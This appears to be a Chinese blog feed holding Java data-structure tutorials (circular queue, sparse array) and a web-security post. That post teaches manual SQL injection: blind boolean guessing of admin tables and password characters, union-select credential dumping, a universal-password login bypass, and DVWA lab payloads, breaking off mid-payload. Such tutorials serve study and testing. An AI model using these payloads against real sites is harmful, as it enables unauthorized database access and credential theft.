class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CircleArrayQueueDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试一把</span></span><br><span class="line"><span class="comment">// 创建一个环形队列</span></span><br><span class="line"><span class="type">CircleArray</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CircleArray</span>(<span class="number">4</span>);<span class="comment">// 设置4，说明队列的有效数据最多为3个</span></span><br><span class="line"><span class="type">char</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&#x27; &#x27;</span>; <span class="comment">// 接收用户输入</span></span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">loop</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// 输出一个菜单</span></span><br><span class="line"><span class="keyword">while</span> (loop) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;s(show): 显示队列&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;e(exit): 退出程序&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;a(add): 添加数据到队列&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;g(get): 从队列取出数据&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;h(head): 查看队列头的数据&quot;</span>);</span><br><span class="line">key = scanner.next().charAt(<span class="number">0</span>);<span class="comment">// 接收一个字符</span></span><br><span class="line"><span class="keyword">switch</span> (key) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">queue.showQueue();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">System.out.println(<span class="string">&quot;输出一个数&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">queue.addQueue(value);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>: <span class="comment">// 取出数据</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> queue.getQueue();</span><br><span class="line">System.out.printf(<span class="string">&quot;取出的数据是%d\n&quot;</span>, res);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">System.out.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>: <span class="comment">// 查看队列头的数据</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> queue.headQueue();</span><br><span class="line">System.out.printf(<span class="string">&quot;队列头的数据是%d\n&quot;</span>, res);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">System.out.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>: <span class="comment">// 退出</span></span><br><span class="line">scanner.close();</span><br><span class="line">loop = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;程序退出~~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CircleArray</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> maxSize;<span class="comment">// 表示数组最大容量</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> front;<span class="comment">// 队列头，指向队列第一个数据，初始值为0</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> rear;<span class="comment">// 队列尾，指向队列最后一个数据的后一个位置，初始值为0</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[] arr;<span class="comment">// 该数组用于存放数据，模拟队列</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">CircleArray</span><span class="params">(<span class="type">int</span> arrMaxSize)</span> &#123;</span><br><span class="line">maxSize = arrMaxSize;</span><br><span class="line">arr = <span class="keyword">new</span> <span class="title class_">int</span>[maxSize];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断队列是否满了</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">isFull</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (rear + <span class="number">1</span>) % maxSize == front;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断队列是否为空</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> rear == front;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加数据到队列</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addQueue</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="comment">// 判断队列是否满了</span></span><br><span class="line"><span class="keyword">if</span> (isFull()) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;队列已满，不能添加数据&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">arr[rear] = n;</span><br><span class="line">rear = (rear + <span class="number">1</span>) % maxSize; <span class="comment">// rear后移</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 出队列</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getQueue</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 判断队列是否为空</span></span><br><span class="line"><span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;队列为空，不能取数据&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">var</span> <span class="operator">=</span> arr[front];</span><br><span class="line">front = (front + <span class="number">1</span>) % maxSize;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示队列所有数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showQueue</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;队列空的，没有数据&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> front; i &lt; front + size(); i++) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;arr[%d]=%d\n&quot;</span>, i % maxSize, arr[i % maxSize]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求出当前队列有效数据的个数</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (rear + maxSize - front) % maxSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示队列的头数据，注意不是取出数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">headQueue</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;队列为空，没有数据&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> arr[front];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构和算法 </tag>
            
            <tag> 队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>稀疏数组</title>
      <link href="/posts/babe/"/>
      <url>/posts/babe/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：韩顺平老师的尚硅谷Java数据结构与java算法 <a href="https://www.bilibili.com/video/BV1E4411H73v">https://www.bilibili.com/video/BV1E4411H73v</a></p></blockquote><h2 id="应用场景分析"><a href="#应用场景分析" class="headerlink" title="应用场景分析"></a>应用场景分析</h2><p>编写的五子棋程序中，有存盘退出和继续上盘的功能。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214850.png"></p><p>分析问题：</p><blockquote><p>因为该二维数组的很多值是默认值0，因此记录了很多没有意义的数据。</p></blockquote><h2 id="稀疏数组（SparseArray）基本介绍"><a href="#稀疏数组（SparseArray）基本介绍" class="headerlink" title="稀疏数组（SparseArray）基本介绍"></a>稀疏数组（SparseArray）基本介绍</h2><p>当一个数组中大部分元素为0，或者为同一个值时，可以使用稀疏数组来保存该数组。<br>稀疏数组的处理方法是：</p><blockquote><ol><li><p>记录数组一共有<strong>几行几列，有多少个不同的值</strong></p></li><li><p>把具有不同值的元素的行列及值记录在一个小规模的数组中，从而<strong>缩小程序</strong>的规模</p></li></ol></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215651.png"></p><h2 id="应用实例思路及实现"><a href="#应用实例思路及实现" class="headerlink" title="应用实例思路及实现"></a>应用实例思路及实现</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215652.png"></p><p>二维数组转稀疏数组的思路：</p><blockquote><p>1.遍历原始的二维数组，得到有效数据的个数sum<br>2.根据sum就可以创建稀疏数组sparseArr &#x3D; int[sum+1] [3]<br>3.将二维数组的有效数据存入到稀疏数组中</p></blockquote><p>稀疏数组转原始的二维数组的思路：</p><blockquote><p>1.先读取稀疏数组的第一行，根据第一行数据，创建原始的二维数组，比如上面的 chessArr2 &#x3D; int[11] [11]<br>2.再读取稀疏数组后几行的数据，并赋给原始的二维数组即可</p></blockquote><p>代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sparsearray;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SparseArray</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建一个原始的二维数组11*11</span></span><br><span class="line"><span class="comment">// 1表示黑子，2表示蓝子，0表示没有棋子</span></span><br><span class="line"><span class="type">int</span> chessArr1[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">11</span>][<span class="number">11</span>];</span><br><span class="line">chessArr1[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">chessArr1[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">2</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;这是原始二维数组：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] row : chessArr1) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> data : row) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;%d\t&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二维数组转稀疏数组的思路：</span></span><br><span class="line"><span class="comment">// 1.遍历原始的二维数组，得到有效数据的个数sum</span></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] row : chessArr1) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> data : row) &#123;</span><br><span class="line"><span class="keyword">if</span> (data != <span class="number">0</span>) &#123;</span><br><span class="line">sum++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.根据sum就可以创建稀疏数组并赋值</span></span><br><span class="line"><span class="type">int</span> sparseArr[][] = <span class="keyword">new</span> <span class="title class_">int</span>[sum + <span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">sparseArr[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">11</span>; <span class="comment">// 代表原始二维数组的行数</span></span><br><span class="line">sparseArr[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">11</span>; <span class="comment">// 代表原始二维数组的列数</span></span><br><span class="line">sparseArr[<span class="number">0</span>][<span class="number">2</span>] = sum;<span class="comment">// 代表原始二维数组的有效数据的个数</span></span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 记录是第几个非0数据</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">11</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">11</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (chessArr1[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">count++;</span><br><span class="line">sparseArr[count][<span class="number">0</span>] = i;</span><br><span class="line">sparseArr[count][<span class="number">1</span>] = j;</span><br><span class="line">sparseArr[count][<span class="number">2</span>] = chessArr1[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;这是稀疏二维数组：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] row : sparseArr) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> data : row) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;%d\t&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 稀疏数组转原始的二维数组的思路：</span></span><br><span class="line"><span class="comment">// 1.先读取稀疏数组的第一行，根据第一行数据，创建原始的二维数组</span></span><br><span class="line"><span class="type">int</span> chessArr2[][] = <span class="keyword">new</span> <span class="title class_">int</span>[sparseArr[<span class="number">0</span>][<span class="number">0</span>]][sparseArr[<span class="number">0</span>][<span class="number">1</span>]];</span><br><span class="line"><span class="comment">// 2.再读取稀疏数组后几行的数据，并赋给原始的二维数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; sparseArr.length; i++) &#123;</span><br><span class="line">chessArr2[sparseArr[i][<span class="number">0</span>]][sparseArr[i][<span class="number">1</span>]] = sparseArr[i][<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;这是恢复后的原始二维数组：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] row : chessArr2) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> data : row) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;%d\t&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 稀疏数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全</title>
      <link href="/posts/4b61/"/>
      <url>/posts/4b61/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入技术"><a href="#SQL注入技术" class="headerlink" title="SQL注入技术"></a>SQL注入技术</h1><hr><h2 id="判断是字符型注入还是数字注入"><a href="#判断是字符型注入还是数字注入" class="headerlink" title="判断是字符型注入还是数字注入"></a>判断是字符型注入还是数字注入</h2><h3 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h3><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p><p>测试步骤：</p><p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p><p>对应的sql：select * from table where id&#x3D;3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加and 1&#x3D;1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1&#x3D;1</p><p>对应的sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面如任何差异；</p><p>（3） 加and 1&#x3D;2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1&#x3D;2</p><p>对应的sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p><p>如果满足以上三点，则可以判断该URL存在数字型注入。</p><h3 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h3><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p><p>例如数字型语句：select * from table where id &#x3D;3</p><p>则字符型如下：select * from table where name&#x3D;’admin’</p><p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p><p>测试步骤：</p><p>（1） 加单引号：select * from table where name&#x3D;’admin’’</p><p>由于加单引号后变成两个单引号，则无法执行，程序会报错；</p><p>（2） 加 admin’ and 1&#x3D;1， 此时sql 语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p><p>Mysql 有三种常用注释符：</p><p>​– 注意，这种注释符后边有一个空格</p><p>​# 通过#进行注释</p><p>​&#x2F;* *&#x2F; 注释掉符号内的内容</p><p>因此，构造语句为：select * from table where name &#x3D;’admin’ and 1&#x3D;1– ’ 可成功执行返回结果正确；</p><p>（3） 加admin’ and 1&#x3D;2– ，此时sql语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;2 – ’则会报错</p><p>如果满足以上三点，可以判断该url为字符型注入。</p><h2 id="手工注入access数据库"><a href="#手工注入access数据库" class="headerlink" title="手工注入access数据库"></a>手工注入access数据库</h2><p><strong>方法：</strong></p><blockquote><p><strong>一、判断网站是否有注入漏洞</strong></p><p>1.选择一个链接【<code>http://192.168.1.3:8008/onews.asp?id=45</code>】,Get传参</p><p>2.测试链接，在链接末尾添加【’】，返回页面错误。</p><p>3.在链接末尾添加【 and 1&#x3D;1】，返回页面正确。</p><p>4.在链接末尾添加【and 1&#x3D;2】，返回页面错误，此时表明该网站存在注入漏洞。</p><p><strong>二、猜解表名和列名</strong></p><p>1.在链接末尾添加语句【and exists(select * from admin)】，页面正常显示，说明存在表名【admin】。</p><p>2.在连接末尾添加语句【and exists(select admin from admin)】，页面正常显示，即在表中存在admin列。</p><p>3.在链接末尾添加语句【and exists(select password from admin)】，页面正常显示，即存在password列。</p><p><strong>三、猜测字段内容</strong></p><p>1.猜测字段的长度，在链接末尾添加语句【and (select <strong>top 1</strong> len (admin) from admin)&gt;<strong>5</strong>】，页面显示错误，说明<strong>字段长度为5</strong>。这个语句表示在表admin里面猜解<strong>第一行</strong>的admin列的长度。</p><p>2.猜测字段的内容，在链接末尾添加语句【and (select top 1 asc(mid(admin,1,1)) from admin)&gt;97】，页面显示错误，可猜解出第一条记录的第一位字符的ASCII码为97，对应a。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> MID() 函数：MID(column_name,<span class="keyword">start</span>[,length])</span><br><span class="line">参数        描述</span><br><span class="line">column_name 必需。要提取字符的字段。</span><br><span class="line"><span class="keyword">start</span>     必需。规定开始位置（起始值是 <span class="number">1</span>）。</span><br><span class="line">length     可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</span><br></pre></td></tr></table></figure><p>3.逐渐猜解，在链接末尾添加语句【and (select top 1 asc(mid(admin,2,1)) from admin)&gt;97】，猜解第二个字符的内容。密码猜测同理。</p></blockquote><h2 id="手工联合查询注入技术"><a href="#手工联合查询注入技术" class="headerlink" title="手工联合查询注入技术"></a>手工联合查询注入技术</h2><p><strong>方法：</strong></p><blockquote><p>1.在链接后面添加语句【order by 11（数字任意）】，根据页面返回结果，来判断站点中的字段数目。</p><p>如：【order by 11】页面显示正确，【order by 12】页面显示错误，说明站点有11个字段。</p><p>2.在链接后面添加语句【union select 1,2,3,4,5,6,7,8,9,10,11 from admin（表名）】，进行联合查询，来暴露可查询的字段编号。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214929.png"></p><p>3.在链接后面添加语句【union select 1,admin,password,4,5,6,7,8,9,10,11 from admin】，即可暴出管理员用户名和密码。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214853.png"></p></blockquote><h2 id="万能密码注入"><a href="#万能密码注入" class="headerlink" title="万能密码注入"></a>万能密码注入</h2><p><strong>原理：</strong></p><blockquote><p>前提：网站后台在进行数据库查询的时候没有对单引号进行过滤</p><p>1.当用户登录时，后台执行的数据库查询操作（SQL语句）是</p><p> 【Select user_id,user_type,email From users Where user_id&#x3D;’用户名’ And password&#x3D;’密码’】。</p><p>2.当输入用户名【admin】和万能密码【2’or’1】时，执行的SQL语句为</p><p> 【Select user_id,user_type,email From users Where user_id&#x3D;’admin’ And password&#x3D;’2’or’1’】。</p><p>3.由于SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】，【and】优先于【or】，且适用传递性。</p><p>4.因此，此SQL语句在后台解析时，分成两句</p><p> 【Select user_id,user_type,email From users Where user_id&#x3D;’admin’ And password&#x3D;’2’】和【’1’】，</p><p>   两句bool值进行逻辑or运算，恒为TRUE。</p></blockquote><h2 id="DVWA之php-mysql手工注入"><a href="#DVWA之php-mysql手工注入" class="headerlink" title="DVWA之php+mysql手工注入"></a>DVWA之php+mysql手工注入</h2><h3 id="1-低安全等级文件包含"><a href="#1-低安全等级文件包含" class="headerlink" title="1.低安全等级文件包含"></a>1.低安全等级文件包含</h3><p><strong>实验步骤：</strong></p><blockquote><p>1.提示输入User ID，输入正确的ID，将显示 ID First name（名），Surname（姓）信息。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214908.png"></p><p>2.尝试输入’，返回错误，可以得知此处为注入点。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214916.png"></p><p>3.尝试输入：<code>1 or 1=1</code>,想要遍历数据库表，并没有达成目的，猜测程序将此处看成了<strong>字符型</strong>。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214858.png"></p><p>4.尝试输入：<code>1’ or’ 1’=’1</code>后遍历出了数据库中的所有内容。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214932.png"></p><p>5.利用order by num语句来测试数据表有多少个字段。（–加空格）表示注释掉sql语句末尾的单引号。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214851.png"></p><p>6.当输入3是，页面报错。页面错误信息如下，Unknown column ‘3’ in ‘order clause’，由此我们判断查询结果值为2列。</p><p>7.注入：&#96;&#96;1’ and 1&#x3D;2 union select 1,2 –&#96;由图得知，First name处显示为查询结果第一列的值，Surname处显示为查询结果第二列的值。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214857.png"></p><p>8.通过注入：<code>1&#39; and 1=2 union select user(),database() --</code>得到数据库用户以及数据库名称。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214919.png"></p><p>9.通过注入：<code>1&#39; and 1=2 union select version(),database() -- </code>得到数据库版本信息。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214930.png"></p><p>10.通过注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;1&#x27;and 1=2 union select 1,@@global.version_compile_os from mysql.user 